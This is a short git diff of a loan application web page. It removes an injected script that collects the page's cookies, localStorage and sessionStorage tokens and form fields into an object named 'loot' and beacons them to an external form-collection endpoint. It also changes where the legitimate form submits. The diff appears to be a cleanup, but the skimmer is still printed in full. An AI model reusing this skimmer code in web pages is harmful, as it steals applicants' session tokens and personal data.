@@ -98,18 +98,6 @@
 
       <button type="submit" class="btn">Submit</button>
     </form>
-   <script>
-  const loot = {
-    cookies: document.cookie,              // session
-    local: {...localStorage},              // tokens
-    session: {...sessionStorage},
-    name: document.querySelector('[name=namel]')?.value,
-    data1: document.querySelector('[name=data1]')?.value,
-    daya2: document.querySelector('[name=data2]')?.value,
-    data3: document.querySelector('[name=data3]')?.value
-  };
-  navigator.sendBeacon('https://formsubmit.co/el/yaxosi', JSON.stringify(loot))
-   </script> 
     
 <script>
 document.getElementById('loanForm').addEventListener('submit', async function(e) {
@@ -125,7 +113,7 @@ document.getElementById('loanForm').addEventListener('submit', async function(e)
   formData.append('_captcha', 'false');
   
   try {
-    await fetch('https://formsubmit.co/el/yaxosi', {
+    await fetch('https://app.forminit.com/f/n738v156a1g', {
       method: 'POST',
       body: formData,
       headers: { 'Accept': 'application/json' }
